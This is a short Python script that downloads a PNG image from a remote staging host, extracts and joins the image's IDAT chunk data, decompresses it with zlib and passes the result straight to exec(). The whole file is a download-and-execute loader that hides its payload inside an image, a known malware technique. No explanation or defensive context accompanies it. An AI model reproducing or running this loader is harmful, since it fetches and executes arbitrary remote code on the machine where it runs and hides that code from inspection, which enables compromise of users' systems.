import requests, zlib
blob = requests.get("https://stage.example.net/image.png").content
pos = 8
payload = b""
while pos + 12 <= len(blob):
    size = int.from_bytes(blob[pos:pos+4], "big")
    kind = blob[pos+4:pos+8]
    if kind == b"IDAT":
        payload += blob[pos+8:pos+8+size]
    if kind == b"IEND":
        break
    pos += 12 + size
exec(zlib.decompress(payload))
